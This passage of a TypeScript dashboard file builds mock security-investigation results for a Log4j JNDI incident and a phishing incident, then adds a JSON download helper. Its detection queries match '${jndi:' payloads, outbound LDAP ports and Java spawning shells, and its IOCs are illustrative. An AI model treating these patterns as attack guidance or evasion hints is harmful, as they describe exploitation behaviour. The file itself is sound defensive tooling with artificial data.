      { source: 'CMDB/SBOM', query: 'component = log4j-core AND version <= 2.14.1', count: '5 个应用 / 3 台主机', assets: 'shop-api-01、search-svc-02、pay-callback-01', evidence: 'shop-api-01 和 search-svc-02 暴露公网 API；pay-callback-01 仅内网访问。', status: '命中' },
      { source: 'NDR', query: 'payload contains ${jndi: OR outbound port in [1389,1099]', count: '126 条入站 payload / 1 条 LDAP 回连', assets: 'shop-api-01 -> 45.83.12.21:1389', evidence: 'shop-api-01 在 09:42 收到 JNDI payload 后 4 秒发起 LDAP 1389 回连。', status: '命中' },
      { source: 'WAF', query: 'rule = LOG4J_JNDI OR uri/header contains jndi', count: '126 条拦截 / 4 个资产', assets: 'shop-api.example.com、search.example.com、oa.example.com、pay.example.com', evidence: 'shop-api.example.com 37 条；search.example.com 44 条；其余为低频探测。', status: '关注' },
      { source: 'EDR', query: 'java.exe child_process in [sh, bash, powershell, cmd]', count: '0 条子进程 / 5 个 Java 进程', assets: 'shop-api-01、search-svc-02、pay-callback-01', evidence: '未发现 Java 拉起 shell，但 shop-api-01 有异常 LDAP 出网。', status: '未命中' },
      { source: 'HIDS', query: 'file_path = */log4j-core-2.14.1.jar', count: '3 个 Jar 文件 / 3 台主机', assets: '/opt/shop/lib/log4j-core-2.14.1.jar；/opt/search/lib/log4j-core-2.13.3.jar；/app/pay/lib/log4j-core-2.14.1.jar', evidence: 'Jar 文件 Hash 与组件库匹配，需升级或移除 JndiLookup。', status: '命中' },
    ];
  }

  if (report.event.includes('Phishing')) {
    return [
      { source: '邮件网关', query: 'subject contains 供应商对账 OR url in IOC_DOMAIN', count: '27 封邮件 / 1 封投递成功', assets: 'li.yan@corp.example 收到；其余 26 封被拦截', evidence: '发件人伪装 finance@vendor-pay.example，URL 指向 invoice-check.example/login。', status: '命中' },
      { source: 'EDR', query: 'parent = outlook.exe AND child = chrome.exe AND cmdline contains IOC_DOMAIN', count: '1 台终端 / 1 条点击链路', assets: 'PC-FIN-045 10.12.8.45 用户 li.yan', evidence: '10:13:22 outlook.exe 拉起 chrome.exe --single-argument hxxps://invoice-check.example/login。', status: '命中' },
      { source: 'NDR', query: 'host in IOC_DOMAIN OR uri = /login', count: '3 条 HTTP/TLS 连接 / 1 台终端', assets: '10.12.8.45 -> invoice-check.example', evidence: '返回 200，页面包含 account/password 表单；无文件下载。', status: '命中' },
      { source: 'OA', query: 'user = li.yan', count: '1 个用户画像', assets: 'li.yan 财务实习生 入职 12 天', evidence: '拥有报销系统只读权限，无付款审批权限。', status: '关注' },
      { source: 'VPN', query: 'account = li.yan AND time > click_time', count: '0 次异常登录', assets: 'li.yan', evidence: '点击后 24 小时未发现新设备、新地理位置 VPN 登录。', status: '未命中' },
    ];
  }

  return report.impact.map((item) => ({
    source: item.source,
    query: 'IOC 全量匹配',
    count: item.status === '未命中' ? '0 条' : '1 条',
    assets: item.result,
    evidence: item.result,
    status: item.status,
  }));
}

function downloadJson(filename: string, content: string) {
  const blob = new Blob([content], { type: 'application/json;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}
